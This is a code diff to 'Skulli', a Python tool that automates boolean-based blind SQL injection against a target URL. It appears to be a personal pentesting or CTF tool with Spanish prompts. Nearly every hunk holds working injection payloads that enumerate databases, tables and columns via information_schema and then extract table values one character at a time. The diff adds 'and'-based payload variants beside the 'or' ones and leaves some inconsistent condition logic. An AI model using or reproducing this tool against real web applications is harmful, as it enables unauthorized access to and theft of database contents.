@@ -55,7 +55,7 @@ class Skulli:
         
     def create_log(self,header,option,logs,separator=','):
         log_name = f'{self.log}.txt'
-        if path.exists(log_name) and header == 'Databases' and not self.recursive:
+        if path.exists(log_name) and header == 'Databases':
             remove(log_name)
         try:
             with open(log_name, 'a') as skll_log:
@@ -95,7 +95,7 @@ class Skulli:
         old_options = options.copy()
 
         if len(options) == 1:
-            return 0
+            return 0, old_options,options
         
         print('\n[+] Elige una opcion:\n')
 
@@ -117,8 +117,12 @@ class Skulli:
         databases = self.get_databases(len1)
         old_dbs = databases.split(',')
         while True:
-            option1 = self.set_options(old_dbs)
+            if len(old_dbs) == 0:
+                print('\n\n[+] Programa finalizado\n')
+                return
+            option1 = 0
             database = old_dbs[option1]
+        
                 
             print('\n')
 
@@ -129,21 +133,6 @@ class Skulli:
                 old_dbs.remove(database)
                 continue
             
-                # while True:
-                #     option1,new_dbs = self.set_options(old_dbs)
-                #     database = new_dbs[option1]
-                #     old_dbs = new_dbs
-                #     self.global_dbs = new_dbs
-
-                #     print('\n')
-
-                #     len2 = self.get_tables_len(database)
-                #     if len2 == None:
-                #         print(f'[!] Ocurrio un error en ({database}), puede que no tenga permisos para esa base de datos, elija otra')
-                #         old_dbs.remove(database)
-                #         continue
-                #     break
-            
             if self.global_tbs == '' and type(self.global_tbs) != list:
                 tables = self.get_tables(self.get_tables_len(database), database)
                 self.global_tbs = tables.split(',')
@@ -151,7 +140,9 @@ class Skulli:
             else:
                 old_tbs = self.global_tbs.copy()
             if len(old_tbs) == 0:
-                break
+                self.global_tbs = ''
+                old_dbs.remove(database)
+                continue
             option2 = self.set_options(old_tbs)
             table = old_tbs[option2]
             self.global_tbs.pop(option2)
@@ -164,7 +155,6 @@ class Skulli:
             print('\n')
 
             self.get_values(self.get_values_len(database,table,columns),database,table,columns)
-            # print('\n\n[+] Programa finalizado\n')
             # return
 
     def condition_of_request(self, match):
@@ -182,36 +172,61 @@ class Skulli:
                 test = requests.get(self.url,data=self.old_data,headers=self.headers)
                 
                 if match in test.text:
-                    return 'in'
-                else:
                     return 'not in'
+                else:
+                    return 'in'
 
     def get_databases_len(self):
         ln = None
         condition = self.condition_of_request(self.match)
-        
-        for i in range(1,200):
-            length = f"' or length((select group_concat(schema_name) from information_schema.schemata))={i}-- -"
-            self.data[self.skll] += length
-            
-            if self.method == 'post':
-                r = requests.post(self.url, data=self.data, headers=self.headers)
-            else:
-                 r = requests.get(self.url,params=self.data ,headers=self.headers)
-            self.data[self.skll] = self.old_data
-            if condition == 'status_code':
-                if r.status_code != self.match:
-                    ln = i
-                    break
-            else:
-                if condition == 'not in':
-                    if self.match not in r.text:
+        if condition == 'in':
+            for i in range(1,200):
+                length = f"' or length((select group_concat(schema_name) from information_schema.schemata))={i}-- -"
+                self.data[self.skll] += length
+                
+                if self.method == 'post':
+                    r = requests.post(self.url, data=self.data, headers=self.headers)
+                else:
+                    r = requests.get(self.url,params=self.data ,headers=self.headers)
+                self.data[self.skll] = self.old_data
+                if condition == 'status_code':
+                    if r.status_code != self.match:
                         ln = i
                         break
                 else:
-                    if self.match in r.text:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            ln = i
+                            break
+                    else:
+                        if self.match in r.text:
+                            ln = i
+                            break
+        else:
+            for i in range(1,200):
+                length = f"' and length((select group_concat(schema_name) from information_schema.schemata))={i}-- -"
+                self.data[self.skll] += length
+                
+                if self.method == 'post':
+                    r = requests.post(self.url, data=self.data, headers=self.headers)
+                else:
+                    r = requests.get(self.url,params=self.data ,headers=self.headers)
+                self.data[self.skll] = self.old_data
+                if condition == 'status_code':
+                    if r.status_code != self.match:
                         ln = i
                         break
+                else:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            ln = i
+                            break
+                    else:
+                        if self.match in r.text:
+                            ln = i
+                            break
+        
+        
         self.data[self.skll] = self.old_data
         return ln
 
@@ -219,37 +234,65 @@ class Skulli:
         databases = ''
         p2 = log.progress('Databases')
         condition = self.condition_of_request(self.match)
-        # proxy = {"http": "http://127.0.0.1:8080"}
 
+        if condition == 'in':
+            for pos in range(1,db_len + 1):
+                for char in self.characters:
+                    payload = f"' or binary substring((select group_concat(schema_name) from information_schema.schemata),{pos},1)='{char}'-- -"
+                    self.data[self.skll] += payload
 
-        for pos in range(1,db_len + 1):
-            for char in self.characters:
-                payload = f"' or binary substring((select group_concat(schema_name) from information_schema.schemata),{pos},1)='{char}'-- -"
-                self.data[self.skll] += payload
+                    if self.method == 'post':
+                        r = requests.post(self.url, data=self.data, headers=self.headers)
+                    else:
+                        r = requests.get(self.url, params=self.data, headers=self.headers)
 
-                if self.method == 'post':
-                    r = requests.post(self.url, data=self.data, headers=self.headers)
-                else:
-                    r = requests.get(self.url, params=self.data, headers=self.headers)
-
-                self.data[self.skll] = self.old_data
-                if condition == 'status_code':
-                    if r.status_code != self.match:
-                        databases += char
-                        p2.status(databases)
-                        break
-                else:
-                    
-                    if condition == 'not in':    
-                        if self.match not in r.text:
+                    self.data[self.skll] = self.old_data
+                    if condition == 'status_code':
+                        if r.status_code != self.match:
                             databases += char
                             p2.status(databases)
                             break
                     else:
-                        if self.match in r.text:
+                        
+                        if condition == 'not in':    
+                            if self.match not in r.text:
+                                databases += char
+                                p2.status(databases)
+                                break
+                        else:
+                            if self.match in r.text:
+                                databases += char
+                                p2.status(databases)
+                                break
+        else:
+            for pos in range(1,db_len + 1):
+                for char in self.characters:
+                    payload = f"' and binary substring((select group_concat(schema_name) from information_schema.schemata),{pos},1)='{char}'-- -"
+                    self.data[self.skll] += payload
+
+                    if self.method == 'post':
+                        r = requests.post(self.url, data=self.data, headers=self.headers)
+                    else:
+                        r = requests.get(self.url, params=self.data, headers=self.headers)
+
+                    self.data[self.skll] = self.old_data
+                    if condition == 'status_code':
+                        if r.status_code != self.match:
                             databases += char
                             p2.status(databases)
                             break
+                    else:
+                        
+                        if condition == 'not in':    
+                            if self.match not in r.text:
+                                databases += char
+                                p2.status(databases)
+                                break
+                        else:
+                            if self.match in r.text:
+                                databases += char
+                                p2.status(databases)
+                                break
                             
         self.data[self.skll] = self.old_data
 
@@ -261,28 +304,54 @@ class Skulli:
         ln = None
         condition = self.condition_of_request(self.match)
 
-        for i in range(1,200):
-            length = f"' or length((select group_concat(table_name) from information_schema.tables where table_schema='{db}'))={i}-- -"
-            self.data[self.skll] += length
-        
-            if self.method == 'post':
-                r = requests.post(self.url, data=self.data, headers=self.headers)
-            else:
-                r = requests.get(self.url, params=self.data, headers=self.headers)
-            self.data[self.skll] = self.old_data
-            if condition == 'status_code':
-                if r.status_code != self.match:
-                    ln = i
-                    break
-            else:
-                if condition == 'not in':
-                    if self.match not in r.text:
+        if condition == 'in':
+            for i in range(1,200):
+                length = f"' or length((select group_concat(table_name) from information_schema.tables where table_schema='{db}'))={i}-- -"
+                self.data[self.skll] += length
+            
+                if self.method == 'post':
+                    r = requests.post(self.url, data=self.data, headers=self.headers)
+                else:
+                    r = requests.get(self.url, params=self.data, headers=self.headers)
+                self.data[self.skll] = self.old_data
+                if condition == 'status_code':
+                    if r.status_code != self.match:
                         ln = i
                         break
                 else:
-                    if self.match in r.text:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            ln = i
+                            break
+                    else:
+                        if self.match in r.text:
+                            ln = i
+                            break
+        else:
+            for i in range(1,200):
+                length = f"' and length((select group_concat(table_name) from information_schema.tables where table_schema='{db}'))={i}-- -"
+                self.data[self.skll] += length
+            
+                if self.method == 'post':
+                    r = requests.post(self.url, data=self.data, headers=self.headers)
+                else:
+                    r = requests.get(self.url, params=self.data, headers=self.headers)
+                self.data[self.skll] = self.old_data
+                if condition == 'status_code':
+                    if r.status_code != self.match:
                         ln = i
                         break
+                else:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            ln = i
+                            break
+                    else:
+                        if self.match in r.text:
+                            ln = i
+                            break
+
+        
         self.data[self.skll] = self.old_data
         return ln
 
@@ -291,33 +360,64 @@ class Skulli:
         p2 = log.progress(f'Tables ({db})')
         condition = self.condition_of_request(self.match)
 
-        for pos in range(1,tb_len + 1):
-            for char in self.characters:
-                payload = f"' or binary substring((select group_concat(table_name) from information_schema.tables where table_schema=\'{db}\'),{pos},1)='{char}'-- -"
-                self.data[self.skll] += payload
+        if condition == 'in':
+            for pos in range(1,tb_len + 1):
+                for char in self.characters:
+                    payload = f"' or binary substring((select group_concat(table_name) from information_schema.tables where table_schema=\'{db}\'),{pos},1)='{char}'-- -"
+                    self.data[self.skll] += payload
 
-                if self.method == 'post':
-                    r = requests.post(self.url, data=self.data, headers=self.headers)
-                else:
-                    r = requests.get(self.url, params=self.data, headers=self.headers)
+                    if self.method == 'post':
+                        r = requests.post(self.url, data=self.data, headers=self.headers)
+                    else:
+                        r = requests.get(self.url, params=self.data, headers=self.headers)
 
-                self.data[self.skll] = self.old_data
-                if condition == 'status_code':
-                    if r.status_code != self.match:
-                        tables += char
-                        p2.status(tables)
-                        break
-                else:
-                    if condition == 'not in':
-                        if self.match not in r.text:
+                    self.data[self.skll] = self.old_data
+                    if condition == 'status_code':
+                        if r.status_code != self.match:
                             tables += char
                             p2.status(tables)
                             break
                     else:
-                        if self.match in r.text:
+                        if condition == 'not in':
+                            if self.match not in r.text:
+                                tables += char
+                                p2.status(tables)
+                                break
+                        else:
+                            if self.match in r.text:
+                                tables += char
+                                p2.status(tables)
+                                break
+        else:
+            for pos in range(1,tb_len + 1):
+                for char in self.characters:
+                    payload = f"' and binary substring((select group_concat(table_name) from information_schema.tables where table_schema=\'{db}\'),{pos},1)='{char}'-- -"
+                    self.data[self.skll] += payload
+
+                    if self.method == 'post':
+                        r = requests.post(self.url, data=self.data, headers=self.headers)
+                    else:
+                        r = requests.get(self.url, params=self.data, headers=self.headers)
+
+                    self.data[self.skll] = self.old_data
+                    if condition == 'status_code':
+                        if r.status_code != self.match:
                             tables += char
                             p2.status(tables)
                             break
+                    else:
+                        if condition == 'not in':
+                            if self.match not in r.text:
+                                tables += char
+                                p2.status(tables)
+                                break
+                        else:
+                            if self.match in r.text:
+                                tables += char
+                                p2.status(tables)
+                                break
+
+        
         self.data[self.skll] = self.old_data
 
         if self.log:
@@ -328,28 +428,54 @@ class Skulli:
         ln = None
         condition = self.condition_of_request(self.match)
 
-        for i in range(1,500):
-            length = f"' or length((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'))={i}-- -"
-            self.data[self.skll] += length
-            
-            if self.method == 'post':
-                r = requests.post(self.url, data=self.data, headers=self.headers)
-            else:
-                 r = requests.get(self.url, params=self.data, headers=self.headers)
-            self.data[self.skll] = self.old_data
-            if condition == 'status_code':
-                if r.status_code != self.match:
-                    ln = i
-                    break
-            else:
-                if condition == 'not in':
-                    if self.match not in r.text:
+        if condition == 'in':
+            for i in range(1,500):
+                length = f"' or length((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'))={i}-- -"
+                self.data[self.skll] += length
+                
+                if self.method == 'post':
+                    r = requests.post(self.url, data=self.data, headers=self.headers)
+                else:
+                    r = requests.get(self.url, params=self.data, headers=self.headers)
+                self.data[self.skll] = self.old_data
+                if condition == 'status_code':
+                    if r.status_code != self.match:
                         ln = i
                         break
                 else:
-                    if self.match in r.text:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            ln = i
+                            break
+                    else:
+                        if self.match in r.text:
+                            ln = i
+                            break
+        else:
+            for i in range(1,500):
+                length = f"' and length((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'))={i}-- -"
+                self.data[self.skll] += length
+                
+                if self.method == 'post':
+                    r = requests.post(self.url, data=self.data, headers=self.headers)
+                else:
+                    r = requests.get(self.url, params=self.data, headers=self.headers)
+                self.data[self.skll] = self.old_data
+                if condition == 'status_code':
+                    if r.status_code != self.match:
                         ln = i
                         break
+                else:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            ln = i
+                            break
+                    else:
+                        if self.match in r.text:
+                            ln = i
+                            break
+
+        
         self.data[self.skll] = self.old_data
         
         return ln
@@ -359,33 +485,63 @@ class Skulli:
         p2 = log.progress(f'Columns ({db})->({table})')
         condition = self.condition_of_request(self.match)
 
-        for pos in range(1,cl_len + 1):
-            for char in self.characters:
-                payload = f"' or binary substring((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'),{pos},1)='{char}'-- -"
-                self.data[self.skll] += payload
+        if condition == 'in':
+            for pos in range(1,cl_len + 1):
+                for char in self.characters:
+                    payload = f"' or binary substring((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'),{pos},1)='{char}'-- -"
+                    self.data[self.skll] += payload
 
-                if self.method == 'post':
-                    r = requests.post(self.url, data=self.data, headers=self.headers)
-                else:
-                    r = requests.get(self.url, params=self.data, headers=self.headers)
+                    if self.method == 'post':
+                        r = requests.post(self.url, data=self.data, headers=self.headers)
+                    else:
+                        r = requests.get(self.url, params=self.data, headers=self.headers)
 
-                self.data[self.skll] = self.old_data
-                if condition == 'status_code':
-                    if r.status_code != self.match:
-                        columns += char
-                        p2.status(columns)
-                        break
-                else:
-                    if condition == 'not in':
-                        if self.match not in r.text:
+                    self.data[self.skll] = self.old_data
+                    if condition == 'status_code':
+                        if r.status_code != self.match:
                             columns += char
                             p2.status(columns)
                             break
                     else:
-                        if self.match in r.text:
+                        if condition == 'not in':
+                            if self.match not in r.text:
+                                columns += char
+                                p2.status(columns)
+                                break
+                        else:
+                            if self.match in r.text:
+                                columns += char
+                                p2.status(columns)
+                                break
+        else:
+            for pos in range(1,cl_len + 1):
+                for char in self.characters:
+                    payload = f"' and binary substring((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'),{pos},1)='{char}'-- -"
+                    self.data[self.skll] += payload
+
+                    if self.method == 'post':
+                        r = requests.post(self.url, data=self.data, headers=self.headers)
+                    else:
+                        r = requests.get(self.url, params=self.data, headers=self.headers)
+
+                    self.data[self.skll] = self.old_data
+                    if condition == 'status_code':
+                        if r.status_code != self.match:
                             columns += char
                             p2.status(columns)
                             break
+                    else:
+                        if condition == 'not in':
+                            if self.match not in r.text:
+                                columns += char
+                                p2.status(columns)
+                                break
+                        else:
+                            if self.match in r.text:
+                                columns += char
+                                p2.status(columns)
+                                break
+
         self.data[self.skll] = self.old_data
 
         if self.log:
@@ -396,28 +552,53 @@ class Skulli:
         ln = None
         condition = self.condition_of_request(self.match)
 
-        for i in range(1,5000):
-            length = f"' or char_length((select group_concat({columns}) from {db}.{table}))={i}-- -"
-            self.data[self.skll] += length
-            
-            if self.method == 'post':
-                r = requests.post(self.url, data=self.data, headers=self.headers)
-            else:
-                 r = requests.get(self.url, params=self.data, headers=self.headers)
-            self.data[self.skll] = self.old_data
-            if condition == 'status_code':
-                if r.status_code != self.match:
-                    ln = i
-                    break
-            else:
-                if condition == 'not in':
-                    if self.match not in r.text:
+        if condition == 'in':
+            for i in range(1,5000):
+                length = f"' or char_length((select group_concat({columns}) from {db}.{table}))={i}-- -"
+                self.data[self.skll] += length
+                
+                if self.method == 'post':
+                    r = requests.post(self.url, data=self.data, headers=self.headers)
+                else:
+                    r = requests.get(self.url, params=self.data, headers=self.headers)
+                self.data[self.skll] = self.old_data
+                if condition == 'status_code':
+                    if r.status_code != self.match:
                         ln = i
                         break
                 else:
-                    if self.match in r.text:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            ln = i
+                            break
+                    else:
+                        if self.match in r.text:
+                            ln = i
+                            break
+        else:
+            for i in range(1,5000):
+                length = f"' and char_length((select group_concat({columns}) from {db}.{table}))={i}-- -"
+                self.data[self.skll] += length
+                
+                if self.method == 'post':
+                    r = requests.post(self.url, data=self.data, headers=self.headers)
+                else:
+                    r = requests.get(self.url, params=self.data, headers=self.headers)
+                self.data[self.skll] = self.old_data
+                if condition == 'status_code':
+                    if r.status_code != self.match:
                         ln = i
                         break
+                else:
+                    if condition == 'not in':
+                        if self.match not in r.text:
+                            ln = i
+                            break
+                    else:
+                        if self.match in r.text:
+                            ln = i
+                            break
+        
         self.data[self.skll] = self.old_data
         
         return ln
@@ -427,33 +608,25 @@ class Skulli:
         parse_columns = columns.replace(',0x3a,', ',')
         p2 = log.progress(f'Values ({db})->({table})->({parse_columns})')
         condition = self.condition_of_request(self.match)
-        separator = ' ^$@ '
+        separator = ' [-] '
         
-        if vl_len > 200:
+        if vl_len > 100:
             p2.status('Muchos datos, exporte a un archivo para ver')
+        
+        if condition == 'in':
+            for pos in range(1,vl_len + 1):
+                for char in self.characters:
+                    payload = f"' or binary substring((select group_concat({columns} separator '{separator}') from {db}.{table}),{pos},1)='{char}'-- -"
+                    self.data[self.skll] += payload
 
-        for pos in range(1,vl_len + 1):
-            for char in self.characters:
-                payload = f"' or binary substring((select group_concat({columns} separator '{separator}') from {db}.{table}),{pos},1)='{char}'-- -"
-                self.data[self.skll] += payload
+                    if self.method == 'post':
+                        r = requests.post(self.url, data=self.data, headers=self.headers)
+                    else:
+                        r = requests.get(self.url, params=self.data, headers=self.headers)
 
-                if self.method == 'post':
-                    r = requests.post(self.url, data=self.data, headers=self.headers)
-                else:
-                    r = requests.get(self.url, params=self.data, headers=self.headers)
-
-                self.data[self.skll] = self.old_data
-                if condition == 'status_code':
-                    if r.status_code != self.match:
-                        values += char
-                        if vl_len > 200:
-                            break
-                        else:
-                            p2.status(values)
-                            break
-                else:
-                    if condition == 'not in':
-                        if self.match not in r.text:
+                    self.data[self.skll] = self.old_data
+                    if condition == 'status_code':
+                        if r.status_code != self.match:
                             values += char
                             if vl_len > 200:
                                 break
@@ -461,13 +634,61 @@ class Skulli:
                                 p2.status(values)
                                 break
                     else:
-                        if self.match in r.text:
+                        if condition == 'not in':
+                            if self.match not in r.text:
+                                values += char
+                                if vl_len > 200:
+                                    break
+                                else:
+                                    p2.status(values)
+                                    break
+                        else:
+                            if self.match in r.text:
+                                values += char
+                                if vl_len > 200:
+                                    break
+                                else:
+                                    p2.status(values)
+                                    break
+        else:
+            for pos in range(1,vl_len + 1):
+                for char in self.characters:
+                    payload = f"' and binary substring((select group_concat({columns} separator '{separator}') from {db}.{table}),{pos},1)='{char}'-- -"
+                    self.data[self.skll] += payload
+
+                    if self.method == 'post':
+                        r = requests.post(self.url, data=self.data, headers=self.headers)
+                    else:
+                        r = requests.get(self.url, params=self.data, headers=self.headers)
+
+                    self.data[self.skll] = self.old_data
+                    if condition == 'status_code':
+                        if r.status_code != self.match:
                             values += char
-                            if vl_len > 200:
+                            if vl_len > 100:
                                 break
                             else:
                                 p2.status(values)
                                 break
+                    else:
+                        if condition == 'not in':
+                            if self.match not in r.text:
+                                values += char
+                                if vl_len > 100:
+                                    break
+                                else:
+                                    p2.status(values)
+                                    break
+                        else:
+                            if self.match in r.text:
+                                values += char
+                                if vl_len > 100:
+                                    break
+                                else:
+                                    p2.status(values)
+                                    break
+
+        
         self.data[self.skll] = self.old_data
 
         if self.log:
@@ -481,34 +702,38 @@ class Skulli:
             return
         len1 = self.get_databases_len()
         databases = self.get_databases(len1)
-        option1,old_dbs,new_dbs = self.which_options(databases) if not self.automatic else self.set_options(databases)
-        database = databases.split(',')[option1]
+        self.global_dbs = databases.split(',')
+        
+        
         
         while True:
-            option1,old_dbs,new_dbs = self.which_options(new_dbs) if not self.automatic else self.set_options(new_dbs)
+            option1,old_dbs,new_dbs = self.which_options(self.global_dbs) if not self.automatic else self.set_options(self.global_dbs)
             database = old_dbs[option1]
+            self.global_dbs = old_dbs.copy()
+            
 
             print('\n')
 
             len2 = self.get_tables_len(database)
             if len2 == None:
-                pass
-                # print('[!] Ocurrio un error, puede que no tenga permisos para esa base de datos/tabla/columns, elija otra')
+                print(f'[!] Ocurrio un error, puede que no tenga permisos para {database}, elija otra')
+                self.global_dbs.remove(database)
+                continue
             else:
                 tables = self.get_tables(self.get_tables_len(database), database)
-                break
-        option2,old_tbs,new_tbs = self.which_options(tables) if not self.automatic else self.set_options(tables)
-        table = tables.split(',')[option2]
+                # break
+            option2,old_tbs,new_tbs = self.which_options(tables) if not self.automatic else self.set_options(tables)
+            table = tables.split(',')[option2]
 
-        print('\n')
+            print('\n')
 
-        columns = self.get_columns(self.get_columns_len(database,table), database, table)
-        columns = columns.replace(',', ",0x3a,")
-        # #print(columns)
+            columns = self.get_columns(self.get_columns_len(database,table), database, table)
+            columns = columns.replace(',', ",0x3a,")
+            # #print(columns)
 
-        print('\n')
+            print('\n')
 
-        self.get_values(self.get_values_len(database,table,columns),database,table,columns)
+            self.get_values(self.get_values_len(database,table,columns),database,table,columns)
 
 def start():
     args = def_args()
